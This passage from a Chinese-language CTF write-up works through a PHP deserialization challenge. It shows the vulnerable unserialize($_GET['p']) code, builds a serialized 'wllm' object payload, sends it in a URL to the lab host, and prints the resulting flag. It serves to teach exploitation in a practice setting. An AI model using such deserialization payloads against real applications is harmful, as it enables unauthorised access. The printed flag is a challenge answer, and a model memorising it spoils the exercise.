            
            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;flag.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 			 <span class="token comment">#include包含flag 当if判断成立时执行</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>          			 <span class="token comment">#输出flag     </span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">admin</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">passwd</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;Just a bit more!&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
 
<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   							<span class="token comment">#get方法获取p并赋值</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   							<span class="token comment">#对p进行反序列化</span>
<span class="token delimiter important">?&gt;</span></span>

</code></pre></div><p><strong>接下来就可以简单构造一下反序列化</strong></p> <div class="language- extra-class"><pre class="language-text"><code>&lt;?php
class wllm{
        public $admin=&quot;admin&quot;;
        public $passwd=&quot;ctf&quot;;
    }
    echo serialize(new wllm());
?&gt;
</code></pre></div><p>**得到一个被反序列化后的值   **</p> <div class="language- extra-class"><pre class="language-text"><code>O:4:&quot;wllm&quot;:2:{s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;}
</code></pre></div><p><strong>再把这个值拼接到url上</strong></p> <div class="language- extra-class"><pre class="language-text"><code>http://node5.anna.nssctf.cn:28965/cl45s.php?
p=O:4:%22wllm%22:2:{s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:3:%22ctf%22;}
</code></pre></div><p><strong>得到flag  <code>NSSCTF{9464157d-b346-447e-a4c3-9ad6395f71d5}</code></strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231102114430253.webp" alt="image-20231102114430253"></p></div> <footer class="page-edit"><!----> <!----></footer> <!----> </main></div><div class="global-ui"></div></div>
    <script src="/Hrgee/assets/js/app.27d78a7b.js" defer></script><script src="/Hrgee/assets/js/2.733019b2.js" defer></script><script src="/Hrgee/assets/js/14.4e4b238e.js" defer></script>
  </body>
</html>
